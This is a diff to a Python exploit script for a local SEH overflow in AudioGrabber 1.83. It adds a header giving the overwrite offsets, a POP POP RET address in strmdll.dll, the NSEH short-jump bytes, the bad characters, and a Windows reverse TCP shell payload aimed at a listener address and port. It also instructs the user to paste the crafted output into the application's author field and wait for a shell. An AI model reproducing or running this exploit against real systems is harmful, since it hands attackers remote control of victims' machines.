@@ -1,4 +1,26 @@
+#!/usr/bin/python
 from struct import pack
+
+#------------------------------------------------------------#
+# To exploit it, run the .py exploit and paste the contents  #
+# of audiograbber_evil.txt to the author field on the        #
+# audiograbber 1.83 application, and wait for a shell        #
+#------------------------------------------------------------#
+# Exploit - AudioGrabber 1.83 local SEH overflow             #
+#                                                            #
+# POP POP RET - 0x48018624                                   #
+# SEH - 0x48018624 - POPPOPRET - strmdll.dll                 #
+# NSEH - "\xEB\x09\x90\x90" - JMP short forward 9            #
+# BAD CHARS - "\x00\x0a\x0d    "                             #
+# PAYLOAD - windows reverse TCP shell                        #
+#   LHOST - 10.0.0.78                                        #
+#   LPORT - 9999                                             #
+#------------------------------------------------------------#
+#   Author : x00pwn                                          #
+#   Date: 10/03/2019                                         #
+#   Victim system: Windows 7 pro                             #
+#   Protections - DEP/no ASLR/no SAFESEH/no                  #
+#------------------------------------------------------------#
 
 
 # SEH handler overwritten with 69413569
@@ -6,7 +28,7 @@ from struct import pack
 # Address=0BADF00D
 # Message=    SEH record (nseh field) at 0x0018f168 overwritten with normal pattern : 0x69413569 (offset 256), followed by 3728 bytes of cyclic data after the handler
 
-nseh_handler = "\xEB\x09\x90\x90"    # JMP 6 bytes forward over the SEH handler
+nseh_handler = "\xEB\x09\x90\x90"    # JMP 9 bytes forward over the SEH handler
 seh_handler = pack('I', 0x48018624) # POP POP RET from strmdll.dll
 
 # Log data, item 24
